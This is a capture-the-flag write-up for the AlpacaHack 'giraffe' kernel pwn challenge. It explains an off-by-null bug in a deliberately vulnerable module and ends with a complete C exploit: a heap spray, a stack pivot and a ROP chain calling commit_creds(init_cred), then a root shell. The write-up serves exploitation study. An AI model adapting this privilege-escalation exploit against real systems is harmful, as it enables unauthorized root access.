# giraffe
<primary-label ref="pwn"/>

AlpacaHack Round10 pwn

## challenge
```C
#define BUF_SIZE 0x20

static struct kmem_cache *giraffe_cache = NULL;

static int module_open(struct inode *inode, struct file *filp) {
  filp->private_data = kmem_cache_alloc(giraffe_cache, GFP_KERNEL);
  if (!filp->private_data)
    return -ENOMEM;
  else
    return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  kmem_cache_free(giraffe_cache, filp->private_data);
  return 0;
}

static ssize_t module_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) {
  char tmp[BUF_SIZE+1] = { 0 };
  size_t datalen;

  strcpy(tmp, filp->private_data);

  datalen = strlen(tmp);
  count = count > datalen ? datalen : count;
  if (copy_to_user(buf, tmp, count))
    return -EINVAL;

	return count;
}

static ssize_t module_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) {
  char tmp[BUF_SIZE+1] = { 0 };
  count = count > BUF_SIZE ? BUF_SIZE : count;

  if (copy_from_user(tmp, buf, count))
    return -EINVAL;

  strcpy(filp->private_data, tmp);

	return strlen(tmp);
}
```

## summary
In this challenge, there's off-by-null vulnerability in write function.

the buffer which allocated by `kmem_cache` has a freelist pointer after the buffer.
You can confirm it by `mm/slub.c`.
```c
static inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)
{
	unsigned long freeptr_addr = (unsigned long)object + s->offset;

#ifdef CONFIG_SLAB_FREELIST_HARDENED
	BUG_ON(object == fp); /* naive detection of double free or corruption */
#endif

	freeptr_addr = (unsigned long)kasan_reset_tag((void *)freeptr_addr);
	*(void **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);
}
```

Here's the buffer after fill all buffer by 'A'(0x41).

![Screenshot_20250506_185704.png](Screenshot_20250506_185704.png)

We can confirm that the freelist pointer were encrypted. So without too bad luck, freelist pointer will not have null byte.

```C
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
				 unsigned long ptr_addr)
{
#ifdef CONFIG_SLAB_FREELIST_HARDENED
	/*
	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.
	 * Normally, this doesn't cause any issues, as both set_freepointer()
	 * and get_freepointer() are called with a pointer with the same tag.
	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For
	 * example, when __free_slub() iterates over objects in a cache, it
	 * passes untagged pointers to check_object(). check_object() in turns
	 * calls get_freepointer() with an untagged pointer, which causes the
	 * freepointer to be restored incorrectly.
	 */
	return (void *)((unsigned long)ptr ^ s->random ^
			swab((unsigned long)kasan_reset_tag((void *)ptr_addr)));
#else
	return ptr;
#endif
}
```
Since any null bytes placed in freelist, `strlen` function will return wrong value from the buffer size, this will cause buffer overflow in kernel stack.

```C
static ssize_t module_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) {
  char tmp[BUF_SIZE+1] = { 0 };
  size_t datalen;

  strcpy(tmp, filp->private_data);

  datalen = strlen(tmp);
  count = count > datalen ? datalen : count;
  if (copy_to_user(buf, tmp, count))
    return -EINVAL;

	return count;
}
```

After spraying buffer and place one next to each other, we can write 0xf byte after the rsp.

Since we have not enough space to kROP, pivot stack into userland, then `commit_cred(init_cred)` and got LPE.

## exploit
```C
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"

#define PROC_NAME "NKTIDKSG"

#define info(fmt, ...) \
    printf(COLOR_CYAN "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define success(fmt, ...) \
    printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define error(fmt, ...) \
    printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define warning(fmt, ...) \
    printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

void *dump_memory(char *buf, int start, int size) {
    char *p = buf;
    for (int i = start; i < start+size; i += 0x10) {
        printf(((i < 0) ? "-0x%05x |" : "0x%06x |"),((i < 0) ? -i: i));
        printf(" %08lx ", *(unsigned long *)(p + i));
        printf(" %08lx ", *(unsigned long *)(p + i + 8));
        printf("\n");
    }
}

unsigned long cs;
unsigned long ss;
unsigned long rsp;
unsigned long rflags;

unsigned long prepare_kernel_cred = 0xffffffff8109f820;
unsigned long commit_creds = 0xffffffff8109f550;
unsigned long init_cred = 0xffffffff81e3ab80;

// readelf -S vmlinux
unsigned long kbase = 0xffffffff81000000;

#define MODULE_NAME "/dev/giraffe"

void shell() {
    puts("[*] shell");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

int init() {
    info("init");
    int fd = open(MODULE_NAME, O_RDWR);
    if (fd < 0) {
        error("[-] open %s failed", MODULE_NAME);
        exit(1);
    }
    return fd;
}

#define SPRAY 0x100

int main(void) {
    int victim = init();
    info("victim fd: %d", victim);
    char payload[0x20];
    memset(payload, 0x41, sizeof(payload));
    write(victim, payload, 0x20);
    close(victim);
    victim = init();
    info("victim fd: %d", victim);
    info("spray");

    int spray[SPRAY]; 


    unsigned long ret = 0xffffffff817f2cf3;
    //unsigned long pop_rdi = 0xffffffff814f430c;// clc; pop rdi; ret;
    unsigned long pop_rdi = 0xffffffff813c9b6d;// clc; pop rdi; ret;
    unsigned long iretq = 0xffffffff81639e96;// iretq;
    unsigned long swapgs = 0xffffffff817e3408;
    unsigned long rip = (unsigned long)shell;
    char chainData[0x1000];
    info("chainData: %p", chainData);


    unsigned long pop_rsp = 0xffffffff8112318f;

    unsigned long *pp = (unsigned long *)&payload[1];
    *pp++ = 0xdeadbeafdeadbeaf;
    *pp++ = 0xabad1deaabad1dea;
    *pp++ = pop_rsp;
    *pp++ = (unsigned long)chainData;

    for (int i = 0;i < SPRAY; i++) {
        spray[i] = init();
        char rbuf[0x100];
        refuge();
        unsigned long *chain = (unsigned long *)chainData;
        //*chain++ = ret;
        *chain++ = pop_rdi;
        *chain++ = init_cred;
        *chain++ = commit_creds;
        *chain++ = swapgs;
        *chain++ = iretq;
        *chain++ = rip;
        *chain++ = cs;
        *chain++ = rflags;
        *chain++ = rsp;
        *chain++ = ss;
        write(spray[i], payload, sizeof(payload));
        read(victim, rbuf, sizeof(rbuf));
    }
}
```